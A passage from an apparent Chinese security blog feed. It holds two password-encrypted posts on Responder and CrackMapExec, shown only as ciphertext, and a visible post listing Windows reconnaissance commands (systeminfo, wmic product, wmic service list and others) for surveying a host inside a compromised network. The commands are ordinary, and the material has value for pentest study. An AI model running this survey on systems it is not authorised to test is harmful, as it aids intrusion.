27f2a57202fe6bc7541ba863fb1ee5729e308ad6663d35b136da584ff6059791aead09695a97869bd652999bfc2977db6cc5b1ebeee0f6fd11ed2a4effa7ef02ce336a92948b11c75fc76d8bc64de3a0dbc2fdb7a57adb73e4057534f787d132e48a129246b437472617f34d843e855cf2999ddae9e5cdb7c5b29196e96cf53c8ab1c40a6ef4da6cd194e759368f57f966f0aa59ec3c03cc3c04edf63708e30320a8c3f752ae30bfa6d5f59d7e15acfe905ca54dd920f03486c545e01bb8a888f2015930d31c6a9e296c00216570259c6e6ab75e2916f3fd9990a1b5db251fe6a963332f119aa84dc836fa22b704e41b62e40f90fcfcaa5f31a9f7316a007e651a17ad40150289e4cb1b6be128a5a918a4db5a1de814b380c0b1a76b591c9d6d90a0fba5f6418643e2ffd411e85ccbbcfa95c63641aa7ebd606153be63f2f1e22f77482605e01f7b21c3331b75a70c1f7e5a2994bcfda2dd58f0ca87058189e16da9113eeed71d2e1d27f9e2e7f82c5302fcf00db050e034671d0e388972c4cf442016ec47128a7d0274541a3adee940b6b4e6cbf8f1afbd7c04524504585e73ce608929ffd854aaccdc06cd5436be6ed5e86672596f4e1a199f5ec65ad031f9a6f3cb65d1cae91aeb49c61943a2139b0900f2b7b2bc1525680cbace5b807be12e9c33e411ab552814068c194261a417de073d3e9c520574abfacf72244c6d0b7ef1edcbaf38521e1d1d7f24aea10f1c13e20d87c286c18c89e69ffbd561acbc2cecfa5513eeeeff94acfac140fbdeb739a4ac37d53846211a25ccd2014f3491b0ed1ec813977a81728a5d92bafa949145abac7cb38ccb991e410e9b3598e2c2d9ce6d1a1a51894fd8ec6e087b991abf8f0251afc260e6e67180088901c1af74567345819ccd6e51f45c8c75e79c5a021fdec86dac7897a17f626c03505d2750e44e97d029644692cc2c28ab5eda7b15e1fc8143478fe23b98258174b1bab694a3ea6fb34971baaa48d970fbf114bb707228404e86bddb1d5927414f9efa0a8aed86097a698da77af6628ed12618edd512adb5567a07c5e86b006510a5ec177d0d305d2074b192fd5178e21cf0d334f860fe3e2185af1c1fecfceb8b758aa938ded51423196a7194ed75fbafd8cba291194d4c152f180245e934cc2e7af501a9ed59a5578e9c2c49876bfecf1620666f66cb117e846e2994e79f73adb9406ac438acd340d28df6531661727c6b6ac0c9b2f2b069d82ffde303bacee48bf781d1aca80072443df1704dcbd0a50722123908ae627e6089b4734dc7f2cb44ea23fefd801e45ffbfe424e3ecd77cfca1fe08e6c6f6d8d0049edd67d1858d93299d23ee6c406d27a3f8d2089aabe6d8d77d7b99f06c62e06402b79db2dafce7d74b0daf9acd45d1549477af34353cc4be4bcfee1c24ae7cbad9eba957310595d59f84930d2c50d952667d9776e3f1da1ec646bb028ef1b12548f8c485ddf575f10dff56a85ba7855cb421d5eb5ac3dedfccd7b6672f43b7afa68e1f19b7a6fe81b7a8de7bf80b86ecc78f01715903f3f84e966b50bc654b655ae9a44318c151763a1f8424d16e04edf4cc5852dcad90994d5f31e9445c536c8aff2792c55eb50cb8360f531dd00f83ea3fa91f92a6d1dd6fbe70b2344ce0a9c4388df97c260469997233001358cc716a97e27aeb9effbf24aae3179be2e8c3341c8d610a2ca27d538c3c33fa4c6c7c3744c2a15fe80bb00a7e61eea94a19db895c4186facd012e64ec91fcc3d7959904209949db751e65928d9cdb51bf3162094c9702f09d809bb19d366eeb873b16cc7710043e519345c59fba8ea5c00dbc98f2f2c542b2f02507cd13a01426f25844791b537f6b4f1124a8504c9aca8e70e1b6d8ebc2e6bc8137ff3cafeb80cad4031b6ddc29caddfdd8b91</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
      <tag>responder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CrackMapExec使用</title>
    <link href="/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/"/>
    <url>/2022/06/15/CrackMapExec%E4%BD%BF%E7%94%A8/CrackMapExec/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="c0d0e9a3dffa910191d6c4c792dff8c29c4f89d751aa7422c0c1dc281a4b1c43">098d9f64412ee3ba7b7422d539a1fc877472f106cbe55dc475402782c6a4c35c30ec24b4aef5741eb22bccf15c37eaf6fa13ed802ef7c1e993ae929e55cef1cfcfece56662a3adc523999cd2caba48e9d98edfa17f3323903f0259af5310f85b77d8b1d60797399db5448b5fe9c3e45ee6d41c3e13e112e820d49af0a508666c01ead4e8904d13d644f6d37cdd6810caa0b7371fb3237dcf53746f77b0e050dbda13937b8d8ea247f89e43e593afa5272086ff03a7c593e0e2bdc41af952b32f29c72a232a1751f5b8f5e75dc71410a764512b54a27bd4a2edcad757818cfc641963332525a157ad67b172110495baf06526762a583b02fe4dff8c49e24b5cf1e5fe69f4780db6b086f2fde4b91748d594abfc6b8454e307b106f3405fdc3d924e21740508b9c5d57aece52a6210cd28557a09557cd52c12482fa07fcb304922f03c17a9a9895d96c976aa54633769174fa58119163352d96ea6a71054db0bbc007e5c58b54f2bcc9b5d4824198988535baad1b3038e2d952e055d2423ccd19cd89bc6766346bc85aa8453e4d4ea36cc98c9c598bae4dac1951c304eeb6f7e798106300eedb55ae560f6f03aa7ed37aed3835344f1c9b4ec8ba6aae32750a330405c4cabf9fd907eafd2083fa95feef432e40affdc0e5ba64021b4fa60f17d8f7505d5a1301f588ac608c5fd24fe42d61787fb130925b715d0cb08729537c8d1f3af8dc763cc9f111dbface6ce9153920b719857a419e1f39b647b1e2a0c50b72e703b198b6869857f3ca7edc0f9ce71669340c4566bed0b07fd9bec79f34812ceddc28e9ddce1a551332728c7cb6891348c19f3d2fc68a60b668b6b03a791b90e936aa5ea71cddc3b8f9559b810989b5c238916fe4b3d8a57201133a31a466a88c7e7ca431788826429e8d4cdabe192e0f7630102244191316e037a4f60194edea333eec6a3dd80778acbf12f0f18af1cc75c769374aa7c6abc2599dd90ef477b6b10ec77d832f463ee13eda8a575fdb3f602c6128786a8d304380880266bff9ec598c7f96719503ccfca47231dda52b203c89463bb5922186460ebb1fd1f53a618b4c93a6a0853bba4d67b97b77f238e206cee6586b6b40204de3747b1ed1ae93012748b21ba32f2a4a0c3daea7cb30416607dfb065259dea6bd46673f28b4731e9ed78f817da1288bdaa3733e1b92152dc56ea4e88a32666a03c1700ca155cbf2b36f034afa2dbcc56f939be357e6c4b25e83fc5ebaf4524edefa8a9edfe360d4ff00e593758ace31a3cff959264060fc07e2a92efdf85875854dbabd3fe8f7e42d18b6f884814e2fcb59be507078f2225b785b820c69bbb3f077da2a1078d7be49b9cd8f2defc0449543f3bac7e042c006faba29696523b0c3e0a5c5c42bfa86f278f66485d8b8a78b98625b3217d195ffc42323bb2e32f1f3fad00b45ba7ead8e997ce1da9f819caabb9a573b25f95b3e14756fae1c287470380c66bc2edbafe0620202f62c1c2ac80b743cf0ec10faa95450ec0f53c3d72f6b5e1680e9b114fb8ce95b6a8c8b7bb25cc8002e5a69745f5300e1d1d0e3db071f741f22be61cdd55619926371272a58a01e820e0e6daaeb0b6c4661a9c3b52b3a768afaf5855c530ec97b5106974aee697b3b8977eca336839d2a4213e933820edb0b49e59d4687374e8ed825bf9c536da435ff64eb22ff3c1a969edb957183e7ce43edf8b5bf8a8a6c2bd3ff9beaf37641d8abc62b33267b707d0e6c153ed6a292a2102a3b5557b850629919d57209dbd4185d2f107295c5b4ada1de93aced6b12d712b4c958108e063782967daeca444f5e90483308ed63f4307f0a0f0d4d6bf035744bb1a1d09040b614c62ad5302b636d4abfcb67540323738f4f3b767da23137eff52c83a62210ab14f6f73cd6c1c19e119b77ee982d3459823526ac127ea32d57b48dce49dacbabaad04edd14ff1a60672d962f16b18b40e7f7751ebbeb1aced0a1d94c1014603ba91568347cd14cb657644511e4ea86458d1ae0794b567c851c00d05a5bb233b053b4d1e0abba801ccd5c594833325e00b637833a15e900940b9fc653f3374a08e736cbd0b078f2f5741ae27837ac52d564dd40a8eb6897eb1ddde3cf8a16e874bc888a97d19fb52d8d5f68420e28e9bc3aeda7b800dc9df70338001dcf73fc67e0b664ecbe9eb0db8ba4fce8fb5afa6bfca08b48ff62a615d73d1c0f6c22e520582647ff7ccd05f926a821ef6fdaba356189972609b16149edd3c5867675335f9e0e44b68236f1bee6ddf58b866f87a01433fd87a626706c4edae1b2184ce3659369597846c13d7dec16eb0dfe104aa1b10b6ec31c7e12915bff6d21b14db2e30179e6446f3e2f387f8d6b2ff19c1f51dd37c3ecf24cfd2b793a0fb6cb2723e8b6f5e069cf18bbcea8f562e40dcb190927ee60d7108f69148d3d6b7acbace0bec242447250c3f8211fbd735a3d44371c7293385754a719208d33069a4e4bceb247ab9ac26c52178f695b238993fb517fed5704bcc69e68ed466d31026ff402ead31e4fda4f0423aa9db7bfc0974c6c8d381a3d000978ae9fe4e31fe9e6fef8dfca670f3bec0f411f9c13d5b83abb8503203329a1834c1a8070f99301873ca8391e12946f8ae436e209729f8a44e8018d58552bfe79857b0b928d5efee9e9bde74b4081ddc005c41e0eaa156af08a71eb1de1d7175250c0c3b4b69610b3264a39e425087f8031610e2b52e4253f9666d021a5989346622bf15d613dadcb4840919446f78d73effd075db343f3341b694de333d35516075eb0e0d2865160cefc47800dd186e51cc9c7e8224705a101e6de60531d68139412eb54999dacc10e4de3545e9a57d90727def808e299d0db536c2ff3e313c765cf25158a9b60227d7b52dbeb19df27950ad95438866e7e7b316ce79463abe211e8ff65ff2b73493e99fd55ad4b45a08db865a92458c4d31029d8534e1d9d7586d17e4ab1e7e594dbd5538141ccdc9c615490f9234a58c2d992cab60678aa9b3c45b1759aaf1bf5fcf06ebc392d5644fcd5e288954839c48d32154a5ed4024e39e3c8285912d3365001b57e76b8393ba82908ae5eb7b0428b96b51371e71da1c5de06b8108c651f4d971a2bd803ab95467a71f1f52e1d0c0d1ba6b71f733cddcc349b40a7ea8586fabf6e93b667aeede8ba588b0405bc6f422256e4c187d286a2058515e3a9c0c19ca99433b35d014e2695029d650f10a48f3598718f86901885d25a64242cb5d350a2c16d625172d5f7ac4a3b792c788ae55f9faaf7a362b3b67de2b5249a0daea54a812c96e2b3b6394be728969a1c4394396906c88a23614297f148c9789e86a96a85cbe0deeb0d9f8ba390919ff6fc71e4f24b28d02c1f4235f55deea2a5e8475ce44e761467efa9cc7ab565fa32d1fe159a5f4e2975580d957b85a83105a04d7da6d0922a21bec16b70bb238b305a4bcf1e6a9241d5e63dc0f5d5c915086879c9edcdd4e99018df79f43830f1c687883d3a8b1a0df4b2942fe52e54b38e2d755d68bb27a47cc04f22671ca2f1a5bf21fb2b2f1a9be16402673fd49c95fc901fd517a7b2e351d1e0f368e016cd1f3412c600269eb291334ea4bd45aecd4066cce4f0d6d00b07ef232a6d39ddf71e63978164d158838a06e402bce5077a686e62fac01009c4ec0ebb6b11e063fc9644521592b4dacb7b1228af852177b26534166270fcd58cd796b3bffc9347274b8a3382c2806758cd123ef1606db3f14b939f90b75fbbef30efe6bb9d2340d2e4c8f265530c5e7032d96d48ccefaa9e2c4563f36ec3083033f77641002552bfdac1c44c40a85d0f3ac3b99114223feb5ceeecb750a8c20f790ce9ee4439eec7ad3e6061ac0d7d9fc570c1cf43132673436ca1b8a166ebcbf34002ce80de0113dba037da7893f78fc8ba4a5a538c160d6338750c18a9721b20826cf1de8badf1b8846ab6a3bb9ed39b5bb6b6350f19b659bcdb640e75e77b57936e6c6b9f2ea49c3a166047b1a35ef34d3a4add8ad20ede2dd619211e2f0f1603947f02609f7e0acae953f65ec89e9604560f7fb43a79419d7cf741eeceb68d009c10e9c4d93f8a36399a537125684db940aab3c9057982f067715b78dbe94a14050964b88686c2e189ef1578d04daaae1ab5a244a0c11b027b0280acd75f67b982079381827fedafa3179c19500ccf9d53a21528211e8cb8dfe0cf5b364ff3353ddb0d7fe521a0269f455a54816f261e34fc17d33fe29622565ecbb052bc173b75ef1fab7a62c92f817819fad91807a8ade531f896bd40a931683ede2d03b0bbc46988e57ecc3ee4fd5a4a9931fbf700668fc93935daa17e9c3f809a0914c248124a7c2ce1cda53c082c427936854907c6d2520b4573e1cf119f08e4f037ca3efb17ec10153c9bfbcf3c558886b7fa3e01ac120ab372b1d9bd6e55f1c9d8dcbb99cf68b0084bbdb72e104c6f5dc8019bd0ae4ef6d549c5dc4c8efde68db08f87f07ed5723c3bb6360e9313b5b52265e5bd672e458b1772198f670ad8ca324067ba2b051cdb9f99da43d69dcd414154f7f3ca0ae053fb88e506c10ae3ed25983e431caf0dedbe7a292421f699b9e5666ae9f5cfb6fedaf29b0f28401b7bc4d704f796522fb331847f7b38f5a1c83ef5c89383ed1d0bc212fcb78d88430cbc12711e8c116e3792e30bc2170971904b6c7950135ef0a1ea69458ba9bdc6390ccd78891c2883147f562ece0a7fa23df204250bdabfc4fda9e2f7f7a0ba40d4fd11b86ec90e6a63699ab98118e045742dc672227b3c48ac565eafec112344d46237b7b9a1a606d44e5913ae1aa7109fcb39e074ee70ce75d8b6595090b96526133a5e71e7e29d1830d3aa06d0a45dd49c37a5a69e5eb87b3fd0391163250669bd87e05dda47ad7f3527452d97d77257759abc181829a6e5e5e6d9f7ee4cb145e58d67d0a4ab8b445588c21028d3ff093eecfc262ef1522c11c1da66eae8b0fcbf7c6577428a6dcbfd0b5820db5f370812e3595268d4f2cb13dda27c4716eadb208a4dfbef30e81348a9d7abfec8d088dad6a46c63758d4f3431785a7e4e7e4f05fe88d44a24055b3c900839f57cfebc19c0026ccbf28497355302a6657d9d5d22b77e0c77a9a019ff05be6a00600e6b52f2e65bd07f7b39b2a348459de63a9436569fd21a50e19828a03cbcb56e8c16fa4f0d1001fef1dff0ee959ffb474e019380d04414a604c99447967bfee40b483edc63cc1986dfb13c99dfc451af61e65a10c998fa74a05f471b4dc6bcea84df318f41d97d8e871f540008fc5d01ed4c389d84dbf99fa5e577a3e570b13697fc449b64c922759f781dcc653300300e07beb07077ff74799fd4982bb13b1d5b7680f6ba0ddb4a23e432db45e9eee9a6fc99d8be2707497b12100cda93759bbfe093e7229fff650d305a555f72970a52ffd013e86fc46052e514959c630d5c5770151b511ffd7ee7376767482057bd132b16eb2f437ba352bbc5ebcd6c62986c9780b59db4ef8f8a848d24346e29ff71dbe24fa0db2b80d00e0e3ac864ca52cf1b678d7720d72f2bee66c056da86f043d9b775df7f774ca81f6f65a73916947dff93aee7e3f0b4e5a946c986fa60cc499a334b3c03bae5a4c4f392d764530fcbfec1705aecefb14d535284531d320b33e2fe89764a20fd98144562f0d695830f76a2be786352b1325591f79274458a0b6a2d477d49a7a3a280ab1055280277b73bc597d341eb9970893a46fdc3d95e7294d3742d1849f1251916225c4806ee2ca90a3e3243966038699e902b65a4db4f7ce272cced0a26a6fdc6004a4969d4ff0d8ecb582a03f66707cb88c56ad4a66a8ff76d19bc23aadb7b102d74e218f6519fe94da1b69d4ce67fcc64f982e2edb2227884cfa618a5fb3b9d0377d0d2562dc9ef1a0f82ef073e8ee0a3a879dea473205b84c38b298776deb29a8ae2075d86f054b1752642f38c128b76b5e48299a3fab40a23ff0b3598b328f20965d7b8461a7296a29164829c8fdf5d47cad79ceb9db622337649c7c0667b68bd459c1589c4632c39c56e118702b08655314d48a14515e1bd240f200040bd4190d0273aec4dd31439e816e77c115f618682cb273394be13b99f69d0fdc48d62802eea0d457a52f43d6bdfbe82908f25e3782fae274baaaee61c38d32f76c3cf6dea07ec190968bbf4c4e25518e6ee2caef68ef7a4e5651b65d24d79a802094925c1802bfa722be217b552050022166e424c4944d858913f04011be04dce08238e32a926f0e082ed1155f6fac8526db2c72ba4e7b9dde03b9f04b17001c3d5deac0ab357a100e413bd285a2c46c964a027bf2503938b40b4071bf94d396d0ac0c3e266863e39644c6e06c2c1966de0792f0144e83d4905ca435df54a792c2b262dde311c5094a16036528b8d9c54998592886e4d3a902bc960ef1022f1552e87898d9d11a3529f4e11861c528429afd394f27d7331e881fbbd3c3dd4ed1a63c8b2089414c65449fc800830d0e1abb537e2bf548ade356538f7a70cb64116d9e5001a508a27a4d10db6a136b6ecb60749c4179266ea1911f173c86777a7e6059fda464b210149396333d743eccec5b788a6ce4cd968b593e98bb4aaaed4c121315baad39f11ef3d3953e0ebafd22708f3f473db1063cfc06535f863e515b571f47c4cc72da619e48896c49c9a76b9d00df6a1839070a713e91d3652290850dcf271a1b9ed7a78e2ab2fdb7ece763daa802d0381a044a2330a58ad59cd1edc4c2f09f4a407c57d0a144552c5602b67c53477eac792c30a2569c0f7ca5bc2332fe8bb46d879b6e952279974c693ad54852cd496f64d1d0684158eb2622a2d0c24021e1fad6189070bc38444f4b6c7039df4b374fcce0de6ec449413451343613517f2bc915ef6e7fca1c83fd0ba1cb57adcf6e5241d45653cd31c144ab765b2c262ed00ac2a599613c52b53b698494fdcd3ad5ba016cf425a473d9caa9b91be2c983f82a3756ccef4908d0b4afce7d9c741dd5f37ae3327509e09d77d1951655a5cc0df5e72326bed4f3c0907aa8733693c3977faef5ea8e10ec10e0b22656a14d302898a1a146e001780e6f1ce572b5a52e6c39359c7e8009a50b9340e4624406446bda480091dd339a208932b49d6445808452dc773390650b13c19283df7b318ae520ac7513d77919ebf33d9b2e6859cbff5be5c9a7d370293c8c007aeb568f3e2b89b59a425f495634eab9aa9f2753dc713d4a59f1ab550f7b36e3d4cc166f8a9f6ad88fdb413922d2724cb7a4e94bf2160aceb203803509d6a9e24ae449d71f0cec774de9db76eca1a301c77f9dc0867f96a4b444865036eac1aa5baf709a03e9781c3743be3dc61bba2cdd174674f393bc0c7872d41188d1f1f6135be9c7e56956a65944eb1638e39139c8cd417ef1fd32389efa55b814b45c5409e80258fdbb1092185777580dd00d138548c6743316d16ddbb4b41f0dc2ca7e0b1555a5e8298c2d68116ed8d71d47dc7358f794d4d98af4309c55b81189f535ac4bc79800db264513699a99c2480952b372ba2605d81df7972a03cb9d2e6d36c964bca723fe48aaa356e7d42a34ff3f491359c3bc4389dc7f1c808b8d70a1459c611fee0fdee7c3dcb7daf37a66deccf0637a46738cf2dda3cf0370480daae60c8ebb88a4a0e035111ed364264b6388ecc2ed4b47d47201474e0fd18dfd3d775563cd27f9003b749971d92b2806e45964f3fd84a653f3f84bbb2ae16d2141f9fd93a0977c4fd7657dcadb278ca80a2d397a3975d3db8c0d3811159288640bf3e0ffb26aa0d6a5a870171c9b70aff29a1cf34abff9ee755912e1f9c03f12e8da7948ad2a56419b414b8cef999896f774c4d7c5a54a1177514cac29b47c36234a72b9eb8cf1b65f5b655852827768882dd741f39da077c8e93b3e8d635b9a97de2dc97d82bc0852ede0e19fc9c61bbe91cf3158c10ab0b7fc036945e25f8d44c80996c59181fdd8bbd9def0dd89fae6b6fa921108780b009b31067f50e00e906e77a31977c01e2981046b122386b816e1fffd7ab0549ea4bcffbcf6d3a5ed76a75f485f608277c649709d1a03113e3f46be8f247797d06bff19a0a0694bcc7ff37cd257502ad6ef8a7db885b015f30e1e3505fc7acb4ebe67d89995ee301a876429885393f1fdb20d9221edd3b59bcb96820beccb867763d3fef2cfc7047055d5377b97fa321131b4c7aacbbf677c695ad598ac831bc5ee6fe83cb0c786e58a0b6c3d65e7d2e07356fc237b04b2d0c9fbb1b381e6be40a3284d4e6d805fe1184a4fd0c62156c5508cac4abd317b5abd6ce2d0e0dd5401ad8d5bf8f732eb7e839231d627328fc178feffb57d47ed92ed735cdf148a11690ea5f59f4d702fe3c3e14a000668ababd247b4b03ed4adfc8454b3ac6409fb8d3652c2f22e9160c02aff3652a58929f90995c20ecb7ff70989dedb9f9e3cdc08ac6107ac945b265fa7c8d68d8ea333496fcbde30c7aaeea56632ea76eb7b85996892a094f888988520fd089d85fc638fb7c629763255c78aa599316aafbf5d6cc70a7aca068532faad8bb0ec13b839bd097a81496c23f415775caa13085bf70b71181602ec7a2429bafe4b9de237a09b18e6aedb7643a78b763e7ccf0ae9c151fa072ca7a70d090369d03d236a99918b3e6d1b96b304f01f5839c1b81bbc0250f9dfc6fb9202a6dfe01dcb9d0b59334b2ac559995de0da6f3c3d6627f370aa0925979608c4041b269e32336656cfa9e935cbfffe638f26f2c5fbba31f41bc0e2e7e528771e45b804a9339a6705f01c9cd6daa7e349fec590413baf71e31891f0f79698ca4cce77df06266568d2522342312bf1479688d25c585900cf751062dc7ef501e51ce7841e8dc27c5cc6a4bb138d02dc75392247455d265df4b85d4c0b7805ae176d32f687003a0e5467ad00b1ef31a122163ec574801a9fcb0d256c0f87032ff89c483132db12752d25c8a1357af61d336d10727372a543b6033cfc839565345ef1d9827ff1e7560dc38845f3d9eb016d10f77b55edf862685789f2e3df9114bd829e4b2cef82d2f4d8327f07b38187812221ae79ab512832b485bd86537fb62ac60c3f6f99bc4c54c2496c2372ad567d803c2aea38a6684af65c32d8bb81f08e2d8397d1333571ba8058900c58000301aa7df17ab07b1a5f6a60fad6ae45709c4ee340a44741ce8045ddb4fe8ec27c646d19f8443a1f588092e23a19f08cb8d01d81f07d7618742dd050d9790fbb4a4b03135ab4e265b0d4fcd163978f1a0d4fe7ff83f7ef34e0d8716f96725845bb6882e39943b88b60b7826cd8862830ee79fb24a47e46d8529c038fe07e57f8dcd7127a5f1b4ec20defa9bebd5bea19dc7c6f28a94ccd19ef33898e9f07e0e3fa30d81657cc9a918d7a813b75146ce0113f94cb4cb401a741915d01ac19b8bbf88ee39df3372486d8325a694afe9b1b0ed90ac7db4f1c9c32aa6715c9032b989d413271b21025fa662b0959028d48734d5d56a7b2b77971408c2d88e1a9a1304ce9bb4af3af50f5d658f04378c7168056c003afe9e3d47dd40e73d926aa0daedb2b87a393fe0ece8d7b4dd7169534c6b921a8ce15ef9d27f7b09ed2b604a041da91ded94ab799e5c23d861a444a0886e356b46134e576a606ba7546fefd575ae6194e2a08c553c64af11476682f7484214680a7a653f5048286bdbbc568218b264f83759b57a4a7468f984159eb7bc3cbb53524fc23435ba7592593920cb8ddc7992558ec9452b4fcc66d2df4a2f4f5c9dcb15486d140156c9bf41d0581c4ff197fbbb8d254db1f02e46448c0ed788d14164ec616952629515fbc1cff622e395b06b8c8eb53e67ba6ff25e436d163fbe5b4018d00bebd4225e9d7ae0a29d16e71b7c48cc85c4bc429b681109141983fc3b0ce94f4d340f4ad0494357da19d04a1c67767e226b06ae5452aea40cecf2ca9c800427bf01b17ebe1e1c3bab6c29473d9eccf81c33f931480552e068c770fcddee3499288b20bcd3b8e59db1d2186087d088b2653f85f3956c22aa8780a892cb11821f28c7247753125613d2a2edbb9471d517705807caf9e5186ef089f87c503e6a8da36c0867e6984096bbdb58c5337cc9f2a930a480d8ed70814ec0479bcf4c5ca88d3ddccf9f81e231d08e116ee45a17756f06e5f46b895a7bf8b522e1aea67897bfe6b3d4ea7be74850aa45cdb51b426b940461c5dd4e521a19252519cc335aa8de56c029d09f63cb15417aad616cd454c1d2b972ea86fd8c43daff333ef22e7340aaffe4ef44e743a36519ce91754267a10a65992585ab574915edcbe67182e9ea5fcbb315b92cdad35eaa25b4afecc56dac6768ebe06836c9bbfc39d92b8799a9dabafd1e2b64876c05b4ce78ff07a26a32513f78f086dcb1de722ef5f428f382baf72028190883f16038a8bce15c4b9b8412a0c658df18f7cd16862eb40457f0a434c042747a403fa238cf5c0475cfbf9853b86a1976bb3535ea20896c85c5355c9c6782a5014eb78f1b5d197c6c72ccb4b7409d20721755f0ff8532d40d23c74d0df1dcd6352cc49b1a7d52baa4bd2c25ce4eec7ea2486c7d426fd865412a2f847d48adfb98b8cc990d8c3d2a9c741912b14236cfc89f30ef9dd03992e3cf18a3233b1eaa25d771b254c465093c859c3a6b2b6e0a7c0cd21842497aaa521abee5ad096906f9dbeb792c4d3adf1b8ee106ac5e4d11fcfadc072ab1eab44f85130dc2f5e78af9b6509b93032d4a3fda0ba289b6de7f439d1b1781364fc51399ce3993611bf8167750ca471e9a5f59f981f77e77ba5a9fa29a6fc39cc03e1548699e7fc6bef85e1f2fea063df1a0633c741acfe1b3eed496934fa075d46461107fec980cfa78bbbc76f5f770ea51dc744958f24a66cf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>CrackMapExec</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息收集</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>1.查询网络配置命令：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><p>2.查询操作系统及软件的信息<br>1）查看操作系统和版本信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br><span class="hljs-string">//</span>适用于英文的操作系统，中文的：<br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br></code></pre></td></tr></table></figure><p>2）查看系统体系结构</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> <span class="hljs-variable">%PROCESSOR_ARCHITECTURE%</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107163924212.png" alt="image-20240107163924212"></p><ol start="3"><li>查看安装的软件及版本、路径等</li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic product <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107163938696.png" alt="image-20240107163938696"></p><p>Powershell版本：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">powershell.exe &quot;Get-WmiObject -class Win32_Product | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> -Property name,Version<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107163950126.png" alt="image-20240107163950126"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-Host</span><br><span class="hljs-variable">$PSVersionTable</span>.PSVERSION<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240108104032647.png" alt="image-20240108104032647"></p><p>3.查询本机服务信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service list brief<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240107164003743.png" alt="image-20240107164003743"><br>4.查询进程列表</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span 